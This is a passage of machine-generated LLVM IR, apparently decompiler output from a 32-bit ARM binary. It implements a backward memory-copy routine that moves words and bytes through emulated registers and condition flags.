  %v3_17990 = load i32, i32* %v2_17990, align 4
  store i32 %v3_17990, i32* @r3, align 4
  %v4_17990 = add i32 %v0_17990, -8
  %v5_17990 = inttoptr i32 %v4_17990 to i32*
  %v6_17990 = load i32, i32* %v5_17990, align 4
  store i32 %v6_17990, i32* %r4.global-to-local, align 4
  %v7_17990 = add i32 %v0_17990, -12
  %v8_17990 = inttoptr i32 %v7_17990 to i32*
  %v9_17990 = load i32, i32* %v8_17990, align 4
  store i32 %v9_17990, i32* @ip, align 4
  %v10_17990 = add i32 %v0_17990, -16
  %v11_17990 = inttoptr i32 %v10_17990 to i32*
  %v12_17990 = load i32, i32* %v11_17990, align 4
  store i32 %v12_17990, i32* %lr.global-to-local, align 4
  store i32 %v10_17990, i32* %r1.global-to-local, align 4
  %v1_17994 = add i32 %v0_1798c, -32
  %v2_17994 = inttoptr i32 %v1_17994 to i32*
  store i32 %v3_17990, i32* %v2_17994, align 4
  %v4_17994 = add i32 %v0_1798c, -28
  %v5_17994 = inttoptr i32 %v4_17994 to i32*
  %v6_17994 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_17994, i32* %v5_17994, align 4
  %v7_17994 = add i32 %v0_1798c, -24
  %v8_17994 = inttoptr i32 %v7_17994 to i32*
  %v9_17994 = load i32, i32* @ip, align 4
  store i32 %v9_17994, i32* %v8_17994, align 4
  %v10_17994 = add i32 %v0_1798c, -20
  %v11_17994 = inttoptr i32 %v10_17994 to i32*
  %v12_17994 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17994, i32* %v11_17994, align 4
  store i32 %v1_17994, i32* %r0.global-to-local, align 4
  %v0_17998 = load i32, i32* %r2.global-to-local, align 4
  %v2_17998 = add i32 %v0_17998, -32
  store i32 %v2_17998, i32* %r2.global-to-local, align 4
  %v6_1799c = icmp slt i32 %v0_17998, 32
  br i1 %v6_1799c, label %dec_label_pc_179a0.loopexit, label %dec_label_pc_17988.dec_label_pc_17988_crit_edge

dec_label_pc_17988.dec_label_pc_17988_crit_edge:  ; preds = %dec_label_pc_17988
  %v0_17988.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17988

dec_label_pc_179a0.loopexit:                      ; preds = %dec_label_pc_17988
  %v4_17998 = sub i32 31, %v0_17998
  %v5_17998 = and i32 %v4_17998, %v0_17998
  %v6_17998 = icmp slt i32 %v5_17998, 0
  %v7_17998 = icmp slt i32 %v2_17998, 0
  store i1 %v6_17998, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17998, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_179a0

dec_label_pc_179a0:                               ; preds = %dec_label_pc_179a0.loopexit, %dec_label_pc_1797c
  %v6_179a8 = phi i32 [ %v1_17994, %dec_label_pc_179a0.loopexit ], [ %v0_1798c37, %dec_label_pc_1797c ]
  %v0_179b0.pr = phi i32 [ %v2_17998, %dec_label_pc_179a0.loopexit ], [ %v2_17980, %dec_label_pc_1797c ]
  %v4_179a0 = add i32 %v0_179b0.pr, 16
  %v6_179a0 = sub i32 0, %v0_179b0.pr
  %v7_179a0 = and i32 %v4_179a0, %v6_179a0
  %v8_179a0 = icmp slt i32 %v7_179a0, 0
  store i1 %v8_179a0, i1* %cpsr_v.global-to-local, align 1
  %v9_179a0 = icmp slt i32 %v4_179a0, 0
  store i1 %v9_179a0, i1* %cpsr_n.global-to-local, align 1
  %v10_179a0 = icmp eq i32 %v4_179a0, 0
  store i1 %v10_179a0, i1* %cpsr_z.global-to-local, align 1
  %v5_179a4 = icmp slt i32 %v0_179b0.pr, -16
  br i1 %v5_179a4, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_179a0
  %v6_179a4 = load i32, i32* %r1.global-to-local, align 4
  %v7_179a4 = add i32 %v6_179a4, -4
  %v8_179a4 = inttoptr i32 %v7_179a4 to i32*
  %v9_179a4 = load i32, i32* %v8_179a4, align 4
  store i32 %v9_179a4, i32* @r3, align 4
  %v10_179a4 = add i32 %v6_179a4, -8
  %v11_179a4 = inttoptr i32 %v10_179a4 to i32*
  %v12_179a4 = load i32, i32* %v11_179a4, align 4
  store i32 %v12_179a4, i32* %r4.global-to-local, align 4
  %v13_179a4 = add i32 %v6_179a4, -12
  %v14_179a4 = inttoptr i32 %v13_179a4 to i32*
  %v15_179a4 = load i32, i32* %v14_179a4, align 4
  store i32 %v15_179a4, i32* @ip, align 4
  %v16_179a4 = add i32 %v6_179a4, -16
  %v17_179a4 = inttoptr i32 %v16_179a4 to i32*
  %v18_179a4 = load i32, i32* %v17_179a4, align 4
  store i32 %v18_179a4, i32* %lr.global-to-local, align 4
  store i32 %v16_179a4, i32* %r1.global-to-local, align 4
  %v7_179a8 = add i32 %v6_179a8, -16
  %v8_179a8 = inttoptr i32 %v7_179a8 to i32*
  store i32 %v9_179a4, i32* %v8_179a8, align 4
  %v10_179a8 = add i32 %v6_179a8, -12
  %v11_179a8 = inttoptr i32 %v10_179a8 to i32*
  %v12_179a8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_179a8, i32* %v11_179a8, align 4
  %v13_179a8 = add i32 %v6_179a8, -8
  %v14_179a8 = inttoptr i32 %v13_179a8 to i32*
  %v15_179a8 = load i32, i32* @ip, align 4
  store i32 %v15_179a8, i32* %v14_179a8, align 4
  %v16_179a8 = add i32 %v6_179a8, -4
  %v17_179a8 = inttoptr i32 %v16_179a8 to i32*
  %v18_179a8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_179a8, i32* %v17_179a8, align 4
  store i32 %v7_179a8, i32* %r0.global-to-local, align 4
  %v6_179ac = load i32, i32* %r2.global-to-local, align 4
  %v7_179ac = add i32 %v6_179ac, -16
  store i32 %v7_179ac, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_179a0, %bb147
  %v6_179b8 = phi i32 [ %v7_179a8, %bb147 ], [ %v6_179a8, %dec_label_pc_179a0 ]
  %v0_179b0 = phi i32 [ %v7_179ac, %bb147 ], [ %v0_179b0.pr, %dec_label_pc_179a0 ]
  %v4_179b0 = add i32 %v0_179b0, 20
  store i32 %v4_179b0, i32* %r2.global-to-local, align 4
  %v6_179b0 = sub i32 0, %v0_179b0
  %v7_179b0 = and i32 %v4_179b0, %v6_179b0
  %v8_179b0 = icmp slt i32 %v7_179b0, 0
  store i1 %v8_179b0, i1* %cpsr_v.global-to-local, align 1
  %v9_179b0 = icmp slt i32 %v4_179b0, 0
  store i1 %v9_179b0, i1* %cpsr_n.global-to-local, align 1
  %v10_179b0 = icmp eq i32 %v4_179b0, 0
  store i1 %v10_179b0, i1* %cpsr_z.global-to-local, align 1
  %v5_179b4 = icmp slt i32 %v0_179b0, -20
  br i1 %v5_179b4, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_179b4 = load i32, i32* %r1.global-to-local, align 4
  %v7_179b4 = add i32 %v6_179b4, -4
  %v8_179b4 = inttoptr i32 %v7_179b4 to i32*
  %v9_179b4 = load i32, i32* %v8_179b4, align 4
  store i32 %v9_179b4, i32* @r3, align 4
  %v10_179b4 = add i32 %v6_179b4, -8
  %v11_179b4 = inttoptr i32 %v10_179b4 to i32*
  %v12_179b4 = load i32, i32* %v11_179b4, align 4
  store i32 %v12_179b4, i32* @ip, align 4
  %v13_179b4 = add i32 %v6_179b4, -12
  %v14_179b4 = inttoptr i32 %v13_179b4 to i32*
  %v15_179b4 = load i32, i32* %v14_179b4, align 4
  store i32 %v15_179b4, i32* %lr.global-to-local, align 4
  store i32 %v13_179b4, i32* %r1.global-to-local, align 4
  %v7_179b8 = add i32 %v6_179b8, -12
  %v8_179b8 = inttoptr i32 %v7_179b8 to i32*
  store i32 %v9_179b4, i32* %v8_179b8, align 4
  %v10_179b8 = add i32 %v6_179b8, -8
  %v11_179b8 = inttoptr i32 %v10_179b8 to i32*
  %v12_179b8 = load i32, i32* @ip, align 4
  store i32 %v12_179b8, i32* %v11_179b8, align 4
  %v13_179b8 = add i32 %v6_179b8, -4
  %v14_179b8 = inttoptr i32 %v13_179b8 to i32*
  %v15_179b8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_179b8, i32* %v14_179b8, align 4
  store i32 %v7_179b8, i32* %r0.global-to-local, align 4
  %v6_179bc = load i32, i32* %r2.global-to-local, align 4
  %v7_179bc = add i32 %v6_179bc, -12
  store i32 %v7_179bc, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_179dc45 = phi i32 [ %v6_179b8, %.thread2 ], [ %v7_179b8, %bb148 ]
  %v0_179c443 = phi i32 [ %v4_179b0, %.thread2 ], [ %v7_179bc, %bb148 ]
  %v2_179c0 = load i8*, i8** %stack_var_-8, align 4
  %v3_179c0 = ptrtoint i8* %v2_179c0 to i32
  store i32 %v3_179c0, i32* @r4, align 4
  store i32 %v8_1797c, i32* @lr, align 4
  br label %dec_label_pc_179c4

dec_label_pc_179c4:                               ; preds = %dec_label_pc_17974, %.thread4
  %v7_179d4 = phi i32 [ %v0_1798c37, %dec_label_pc_17974 ], [ %v6_179dc45, %.thread4 ]
  %v0_179c4 = phi i32 [ %v2_17974, %dec_label_pc_17974 ], [ %v0_179c443, %.thread4 ]
  %v2_179c4 = add i32 %v0_179c4, 8
  store i32 %v2_179c4, i32* %r2.global-to-local, align 4
  %v4_179c4 = sub i32 0, %v0_179c4
  %v5_179c4 = and i32 %v2_179c4, %v4_179c4
  %v6_179c4 = icmp slt i32 %v5_179c4, 0
  store i1 %v6_179c4, i1* %cpsr_v.global-to-local, align 1
  %v7_179c4 = icmp slt i32 %v2_179c4, 0
  store i1 %v7_179c4, i1* %cpsr_n.global-to-local, align 1
  %v8_179c4 = icmp eq i32 %v2_179c4, 0
  store i1 %v8_179c4, i1* %cpsr_z.global-to-local, align 1
  %v5_179c8 = icmp slt i32 %v0_179c4, -8
  br i1 %v5_179c8, label %bb150, label %dec_label_pc_179cc

dec_label_pc_179cc:                               ; preds = %dec_label_pc_179c4
  %v6_179cc = add i32 %v0_179c4, 4
  store i32 %v6_179cc, i32* %r2.global-to-local, align 4
  %v8_179cc = sub i32 -5, %v0_179c4
  %v9_179cc = and i32 %v8_179cc, %v2_179c4
  %v10_179cc = icmp slt i32 %v9_179cc, 0
  store i1 %v10_179cc, i1* %cpsr_v.global-to-local, align 1
  %v11_179cc = icmp slt i32 %v6_179cc, 0
  store i1 %v11_179cc, i1* %cpsr_n.global-to-local, align 1
  %v12_179cc = icmp eq i32 %v2_179c4, 4
  store i1 %v12_179cc, i1* %cpsr_z.global-to-local, align 1
  %v5_179d0 = icmp slt i32 %v2_179c4, 4
  %v6_179d0 = load i32, i32* %r1.global-to-local, align 4
  %v7_179d0 = add i32 %v6_179d0, -4
  %v8_179d0 = inttoptr i32 %v7_179d0 to i32*
  %v9_179d0 = load i32, i32* %v8_179d0, align 4
  store i32 %v9_179d0, i32* @r3, align 4
  br i1 %v5_179d0, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_179cc
  store i32 %v7_179d0, i32* %r1.global-to-local, align 4
  %v8_179d4 = add i32 %v7_179d4, -4
  %v9_179d4 = inttoptr i32 %v8_179d4 to i32*
  store i32 %v9_179d0, i32* %v9_179d4, align 4
  %v10_179d4 = load i32, i32* %r0.global-to-local, align 4
  %v11_179d4 = add i32 %v10_179d4, -4
  store i32 %v11_179d4, i32* %r0.global-to-local, align 4
  %v0_179e4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_179cc
  %v10_179d8 = add i32 %v6_179d0, -8
  %v11_179d8 = inttoptr i32 %v10_179d8 to i32*
  %v12_179d8 = load i32, i32* %v11_179d8, align 4
  store i32 %v12_179d8, i32* @ip, align 4
  store i32 %v10_179d8, i32* %r1.global-to-local, align 4
  %v7_179dc = add i32 %v7_179d4, -8
  %v8_179dc = inttoptr i32 %v7_179dc to i32*
  store i32 %v9_179d0, i32* %v8_179dc, align 4
  %v10_179dc = add i32 %v7_179d4, -4
  %v11_179dc = inttoptr i32 %v10_179dc to i32*
  %v12_179dc = load i32, i32* @ip, align 4
  store i32 %v12_179dc, i32* %v11_179dc, align 4
  store i32 %v7_179dc, i32* %r0.global-to-local, align 4
  %v6_179e0 = load i32, i32* %r2.global-to-local, align 4
  %v7_179e0 = add i32 %v6_179e0, -4
  store i32 %v7_179e0, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %dec_label_pc_179c4, %dec_label_pc_17954, %.thread14, %dec_label_pc_17b88, %dec_label_pc_17b1c, %dec_label_pc_17ab0, %bb149
  %v2_179e8 = phi i32 [ %v11_179d4, %.thread8 ], [ %v7_179d4, %dec_label_pc_179c4 ], [ %v2_17958, %dec_label_pc_17954 ], [ %v0_17a8020, %.thread14 ], [ %v2_179f453, %dec_label_pc_17b88 ], [ %v2_179f452, %dec_label_pc_17b1c ], [ %v2_179f451, %dec_label_pc_17ab0 ], [ %v7_179dc, %bb149 ]
  %v0_179e4 = phi i32 [ %v0_179e4.pre, %.thread8 ], [ %v2_179c4, %dec_label_pc_179c4 ], [ %v2_1795c, %dec_label_pc_17954 ], [ %v2_17a28, %.thread14 ], [ %v0_179e449, %dec_label_pc_17b88 ], [ %v0_179e448, %dec_label_pc_17b1c ], [ %v0_179e447, %dec_label_pc_17ab0 ], [ %v7_179e0, %bb149 ]
  %v1_179e4 = add i32 %v0_179e4, 4
  store i32 %v1_179e4, i32* %r2.global-to-local, align 4
  %v3_179e4 = sub i32 0, %v0_179e4
  %v4_179e4 = and i32 %v1_179e4, %v3_179e4
  %v5_179e4 = icmp slt i32 %v4_179e4, 0
  store i1 %v5_179e4, i1* %cpsr_v.global-to-local, align 1
  %v6_179e4 = icmp slt i32 %v1_179e4, 0
  store i1 %v6_179e4, i1* %cpsr_n.global-to-local, align 1
  %v7_179e4 = icmp eq i32 %v1_179e4, 0
  store i1 %v7_179e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_179e4, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_179ec = add i32 %v0_179e4, 2
  %v3_179ec = sub i32 -3, %v0_179e4
  %v4_179ec = and i32 %v3_179ec, %v1_179e4
  %v5_179ec = icmp slt i32 %v4_179ec, 0
  store i1 %v5_179ec, i1* %cpsr_v.global-to-local, align 1
  %v6_179ec = icmp slt i32 %v1_179ec, 0
  store i1 %v6_179ec, i1* %cpsr_n.global-to-local, align 1
  %v7_179ec = icmp eq i32 %v1_179e4, 2
  store i1 %v7_179ec, i1* %cpsr_z.global-to-local, align 1
  %v0_179f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_179f0 = add i32 %v0_179f0, -1
  %v2_179f0 = inttoptr i32 %v1_179f0 to i8*
  %v3_179f0 = load i8, i8* %v2_179f0, align 1
  %v4_179f0 = zext i8 %v3_179f0 to i32
  store i32 %v4_179f0, i32* @r3, align 4
  store i32 %v1_179f0, i32* %r1.global-to-local, align 4
  %v3_179f4 = add i32 %v2_179e8, -1
  %v4_179f4 = inttoptr i32 %v3_179f4 to i8*
  store i8 %v3_179f0, i8* %v4_179f4, align 1
  %v5_179f4 = load i32, i32* %r0.global-to-local, align 4
  %v6_179f4 = add i32 %v5_179f4, -1
  store i32 %v6_179f4, i32* %r0.global-to-local, align 4
  %v0_179f8 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_179f8 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_179f8 = xor i1 %v0_179f8, %v1_179f8
  br i1 %v2_179f8, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_179f8 = load i32, i32* %r1.global-to-local, align 4
  %v4_179f8 = add i32 %v3_179f8, -1
  %v5_179f8 = inttoptr i32 %v4_179f8 to i8*
  %v6_179f8 = load i8, i8* %v5_179f8, align 1
  %v7_179f8 = zext i8 %v6_179f8 to i32
  store i32 %v7_179f8, i32* @r3, align 4
  store i32 %v4_179f8, i32* %r1.global-to-local, align 4
  %v6_179fc = add i32 %v5_179f4, -2
  %v7_179fc = inttoptr i32 %v6_179fc to i8*
  store i8 %v6_179f8, i8* %v7_179fc, align 1
  %v8_179fc = load i32, i32* %r0.global-to-local, align 4
  %v9_179fc = add i32 %v8_179fc, -1
  store i32 %v9_179fc, i32* %r0.global-to-local, align 4
  %v1_17a00.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_17a00.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_17a04 = phi i32 [ %v9_179fc, %bb152 ], [ %v6_179f4, %bb151 ]
  %v2_17a04 = phi i1 [ %v2_17a00.pre, %bb152 ], [ %v1_179f8, %bb151 ]
  %v1_17a04 = phi i1 [ %v1_17a00.pre, %bb152 ], [ %v0_179f8, %bb151 ]
  %v0_17a00 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_17a00 = xor i1 %v2_17a04, %v1_17a04
  %v4_17a00 = or i1 %v0_17a00, %v3_17a00
  br i1 %v4_17a00, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_17a00 = load i32, i32* %r1.global-to-local, align 4
  %v6_17a00 = add i32 %v5_17a00, -1
  %v7_17a00 = inttoptr i32 %v6_17a00 to i8*
  %v8_17a00 = load i8, i8* %v7_17a00, align 1
  %v9_17a00 = zext i8 %v8_17a00 to i32
  store i32 %v9_17a00, i32* @r3, align 4
  store i32 %v6_17a00, i32* %r1.global-to-local, align 4
  %v8_17a04 = add i32 %v7_17a04, -1
  %v9_17a04 = inttoptr i32 %v8_17a04 to i8*
  store i8 %v8_17a00, i8* %v9_17a04, align 1
  %v10_17a04 = load i32, i32* %r0.global-to-local, align 4
  %v11_17a04 = add i32 %v10_17a04, -1
  store i32 %v11_17a04, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_17a0c:                               ; preds = %dec_label_pc_17964
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_17a0c = icmp eq i32 %v1_17964, 1
  store i1 %v8_17a0c, i1* %cpsr_n.global-to-local, align 1
  %v9_17a0c = icmp eq i32 %v1_17964, 2
  store i1 %v9_17a0c, i1* %cpsr_z.global-to-local, align 1
  %v1_17a10 = add i32 %v2_17954, -1
  %v2_17a10 = inttoptr i32 %v1_17a10 to i8*
  %v3_17a10 = load i8, i8* %v2_17a10, align 1
  %v4_17a10 = zext i8 %v3_17a10 to i32
  store i32 %v4_17a10, i32* @r3, align 4
  store i32 %v1_17a10, i32* %r1.global-to-local, align 4
  %v3_17a14 = add i32 %v2_17958, -1
  %v4_17a14 = inttoptr i32 %v3_17a14 to i8*
  store i8 %v3_17a10, i8* %v4_17a14, align 1
  %v5_17a14 = load i32, i32* %r0.global-to-local, align 4
  %v6_17a14 = add i32 %v5_17a14, -1
  store i32 %v6_17a14, i32* %r0.global-to-local, align 4
  br i1 %v8_17a0c, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_17a0c
  %v6_17a18 = load i32, i32* %r1.global-to-local, align 4
  %v7_17a18 = add i32 %v6_17a18, -1
  %v8_17a18 = inttoptr i32 %v7_17a18 to i8*
  %v9_17a18 = load i8, i8* %v8_17a18, align 1
  %v10_17a18 = zext i8 %v9_17a18 to i32
  store i32 %v10_17a18, i32* @r3, align 4
  store i32 %v7_17a18, i32* %r1.global-to-local, align 4
  %v9_17a1c = add i32 %v5_17a14, -2
  %v10_17a1c = inttoptr i32 %v9_17a1c to i8*
  store i8 %v9_17a18, i8* %v10_17a1c, align 1
  %v11_17a1c = load i32, i32* %r0.global-to-local, align 4
  %v12_17a1c = add i32 %v11_17a1c, -1
  store i32 %v12_17a1c, i32* %r0.global-to-local, align 4
  br i1 %v9_17a0c, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_17a20 = load i32, i32* %r1.global-to-local, align 4
  %v9_17a20 = add i32 %v8_17a20, -1
  %v10_17a20 = inttoptr i32 %v9_17a20 to i8*
  %v11_17a20 = load i8, i8* %v10_17a20, align 1
  %v12_17a20 = zext i8 %v11_17a20 to i32
  store i32 %v12_17a20, i32* @r3, align 4
  store i32 %v9_17a20, i32* %r1.global-to-local, align 4
  %v11_17a24 = add i32 %v11_17a1c, -2
  %v12_17a24 = inttoptr i32 %v11_17a24 to i8*
  store i8 %v11_17a20, i8* %v12_17a24, align 1
  %v13_17a24 = load i32, i32* %r0.global-to-local, align 4
  %v14_17a24 = add i32 %v13_17a24, -1
  store i32 %v14_17a24, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_17a0c, %bb155
  %v0_17a8020 = phi i32 [ %v12_17a1c, %bb154 ], [ %v6_17a14, %dec_label_pc_17a0c ], [ %v14_17a24, %bb155 ]
  %v0_17a28 = load i32, i32* %r2.global-to-local, align 4
  %v1_17a28 = load i32, i32* @ip, align 4
  %v2_17a28 = sub i32 %v0_17a28, %v1_17a28
  store i32 %v2_17a28, i32* %r2.global-to-local, align 4
  %v4_17a28 = xor i32 %v1_17a28, %v0_17a28
  %v5_17a28 = xor i32 %v2_17a28, %v0_17a28
  %v6_17a28 = and i32 %v5_17a28, %v4_17a28
  %v7_17a28 = icmp slt i32 %v6_17a28, 0
  store i1 %v7_17a28, i1* %cpsr_v.global-to-local, align 1
  %v8_17a28 = icmp slt i32 %v2_17a28, 0
  store i1 %v8_17a28, i1* %cpsr_n.global-to-local, align 1
  %v9_17a28 = icmp eq i32 %v0_17a28, %v1_17a28
  store i1 %v9_17a28, i1* %cpsr_z.global-to-local, align 1
  %v5_17a2c = icmp slt i32 %v0_17a28, %v1_17a28
  br i1 %v5_17a2c, label %bb150, label %dec_label_pc_17a30

dec_label_pc_17a30:                               ; preds = %.thread14
  %v0_17a30 = load i32, i32* %r1.global-to-local, align 4
  %v1_17a30 = urem i32 %v0_17a30, 4
  store i32 %v1_17a30, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17a30 = icmp eq i32 %v1_17a30, 0
  store i1 %v2_17a30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17a30, label %dec_label_pc_17974, label %dec_label_pc_17a38

dec_label_pc_17a38:                               ; preds = %dec_label_pc_1796c, %dec_label_pc_17a30
  %v0_17a8019 = phi i32 [ %v2_17958, %dec_label_pc_1796c ], [ %v0_17a8020, %dec_label_pc_17a30 ]
  %v0_17b2c = phi i32 [ %v2_1795c, %dec_label_pc_1796c ], [ %v2_17a28, %dec_label_pc_17a30 ]
  %v0_17a38 = phi i32 [ %v2_17954, %dec_label_pc_1796c ], [ %v0_17a30, %dec_label_pc_17a30 ]
  %v0_17a40 = phi i32 [ %v1_1796c, %dec_label_pc_1796c ], [ %v1_17a30, %dec_label_pc_17a30 ]
  %v1_17a38 = and i32 %v0_17a38, -4
  store i32 %v1_17a38, i32* %r1.global-to-local, align 4
  %v1_17a3c = inttoptr i32 %v1_17a38 to i32*
  %v2_17a3c = load i32, i32* %v1_17a3c, align 4
  store i32 %v2_17a3c, i32* @r3, align 4
  %v7_17a40 = icmp ult i32 %v0_17a40, 2
  %v2_17b24 = add i32 %v0_17b2c, -12
  %v4_17b24 = sub i32 11, %v0_17b2c
  %v5_17b24 = and i32 %v4_17b24, %v0_17b2c
  %v6_17b24 = icmp slt i32 %v5_17b24, 0
  store i1 %v6_17b24, i1* %cpsr_v.global-to-local, align 1
  %v7_17b24 = icmp slt i32 %v2_17b24, 0
  store i1 %v7_17b24, i1* %cpsr_n.global-to-local, align 1
  %v8_17b24 = icmp eq i32 %v0_17b2c, 12
  store i1 %v8_17b24, i1* %cpsr_z.global-to-local, align 1
  %v5_17b28 = icmp slt i32 %v0_17b2c, 12
  br i1 %v7_17a40, label %dec_label_pc_17b24, label %dec_label_pc_17a48

dec_label_pc_17a48:                               ; preds = %dec_label_pc_17a38
  %v8_17a40 = icmp eq i32 %v0_17a40, 2
  br i1 %v8_17a40, label %dec_label_pc_17ab8, label %dec_label_pc_17a4c

dec_label_pc_17a4c:                               ; preds = %dec_label_pc_17a48
  br i1 %v5_17b28, label %dec_label_pc_17a98, label %dec_label_pc_17a54

dec_label_pc_17a54:                               ; preds = %dec_label_pc_17a4c
  store i32 %v2_17b24, i32* %r2.global-to-local, align 4
  %v3_17a58 = load i32, i32* @r4, align 4
  store i32 %v3_17a58, i32* %stack_var_-12, align 4
  %v6_17a58 = load i32, i32* @r5, align 4
  %v8_17a58 = inttoptr i32 %v6_17a58 to i8*
  store i8* %v8_17a58, i8** %stack_var_-8, align 4
  %v11_17a58 = load i32, i32* @lr, align 4
  br label %dec_label_pc_17a5c

dec_label_pc_17a5c:                               ; preds = %dec_label_pc_17a5c.dec_label_pc_17a5c_crit_edge, %dec_label_pc_17a54
  %v0_17a80 = phi i32 [ %v1_17a80, %dec_label_pc_17a5c.dec_label_pc_17a5c_crit_edge ], [ %v0_17a8019, %dec_label_pc_17a54 ]
  %v0_17a60 = phi i32 [ %v0_17a60.pre, %dec_label_pc_17a5c.dec_label_pc_17a5c_crit_edge ], [ %v1_17a38, %dec_label_pc_17a54 ]
  %v0_17a5c = phi i32 [ %v0_17a5c.pre, %dec_label_pc_17a5c.dec_label_pc_17a5c_crit_edge ], [ %v2_17a3c, %dec_label_pc_17a54 ]
  %v3_17a5c = mul i32 %v0_17a5c, 256
  store i32 %v3_17a5c, i32* %lr.global-to-local, align 4
  %v1_17a60 = add i32 %v0_17a60, -4
  %v2_17a60 = inttoptr i32 %v1_17a60 to i32*
  %v3_17a60 = load i32, i32* %v2_17a60, align 4
  store i32 %v3_17a60, i32* @r3, align 4
  %v4_17a60 = add i32 %v0_17a60, -8
  %v5_17a60 = inttoptr i32 %v4_17a60 to i32*
  %v6_17a60 = load i32, i32* %v5_17a60, align 4
  store i32 %v6_17a60, i32* %r4.global-to-local, align 4
  %v7_17a60 = add i32 %v0_17a60, -12
  %v8_17a60 = inttoptr i32 %v7_17a60 to i32*
  %v9_17a60 = load i32, i32* %v8_17a60, align 4
  store i32 %v9_17a60, i32* %r5.global-to-local, align 4
  %v10_17a60 = add i32 %v0_17a60, -16
  %v11_17a60 = inttoptr i32 %v10_17a60 to i32*
  %v12_17a60 = load i32, i32* %v11_17a60, align 4
  store i32 %v10_17a60, i32* %r1.global-to-local, align 4
  %v4_17a64 = udiv i32 %v12_17a60, 16777216
  %v5_17a64 = or i32 %v4_17a64, %v3_17a5c
  store i32 %v5_17a64, i32* %lr.global-to-local, align 4
  %v3_17a68 = mul i32 %v12_17a60, 256
  %v4_17a6c = udiv i32 %v9_17a60, 16777216
  %v5_17a6c = or i32 %v3_17a68, %v4_17a6c
  store i32 %v5_17a6c, i32* @ip, align 4
  %v3_17a70 = mul i32 %v9_17a60, 256
  %v4_17a74 = udiv i32 %v6_17a60, 16777216
  %v5_17a74 = or i32 %v3_17a70, %v4_17a74
  store i32 %v5_17a74, i32* %r5.global-to-local, align 4
  %v3_17a78 = mul i32 %v6_17a60, 256
  %v4_17a7c = udiv i32 %v3_17a60, 16777216
  %v5_17a7c = or i32 %v3_17a78, %v4_17a7c
  store i32 %v5_17a7c, i32* %r4.global-to-local, align 4
  %v1_17a80 = add i32 %v0_17a80, -16
  %v2_17a80 = inttoptr i32 %v1_17a80 to i32*
  store i32 %v5_17a7c, i32* %v2_17a80, align 4
  %v4_17a80 = add i32 %v0_17a80, -12
  %v5_17a80 = inttoptr i32 %v4_17a80 to i32*
  %v6_17a80 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_17a80, i32* %v5_17a80, align 4
  %v7_17a80 = add i32 %v0_17a80, -8
  %v8_17a80 = inttoptr i32 %v7_17a80 to i32*
  %v9_17a80 = load i32, i32* @ip, align 4
  store i32 %v9_17a80, i32* %v8_17a80, align 4
  %v10_17a80 = add i32 %v0_17a80, -4
  %v11_17a80 = inttoptr i32 %v10_17a80 to i32*
  %v12_17a80 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17a80, i32* %v11_17a80, align 4
  store i32 %v1_17a80, i32* %r0.global-to-local, align 4
  %v0_17a84 = load i32, i32* %r2.global-to-local, align 4
  %v2_17a84 = add i32 %v0_17a84, -16
  store i32 %v2_17a84, i32* %r2.global-to-local, align 4
  %v6_17a88 = icmp slt i32 %v0_17a84, 16
  br i1 %v6_17a88, label %dec_label_pc_17a8c, label %dec_label_pc_17a5c.dec_label_pc_17a5c_crit_edge

dec_label_pc_17a5c.dec_label_pc_17a5c_crit_edge:  ; preds = %dec_label_pc_17a5c
  %v0_17a5c.pre = load i32, i32* @r3, align 4
  %v0_17a60.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17a5c

dec_label_pc_17a8c:                               ; preds = %dec_label_pc_17a5c
  %v2_17a8c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17a8c, i32* @r4, align 4
  %v5_17a8c = load i8*, i8** %stack_var_-8, align 4
  %v6_17a8c = ptrtoint i8* %v5_17a8c to i32
  store i32 %v6_17a8c, i32* @r5, align 4
  store i32 %v11_17a58, i32* @lr, align 4
  %v2_17a90 = add i32 %v0_17a84, -4
  store i32 %v2_17a90, i32* %r2.global-to-local, align 4
  %v4_17a90 = add i32 %v0_17a84, 2147483632
  %v5_17a90 = and i32 %v2_17a90, %v4_17a90
  %v6_17a90 = icmp slt i32 %v5_17a90, 0
  store i1 %v6_17a90, i1* %cpsr_v.global-to-local, align 1
  %v7_17a90 = icmp slt i32 %v2_17a90, 0
  store i1 %v7_17a90, i1* %cpsr_n.global-to-local, align 1
  %v8_17a90 = icmp eq i32 %v2_17a90, 0
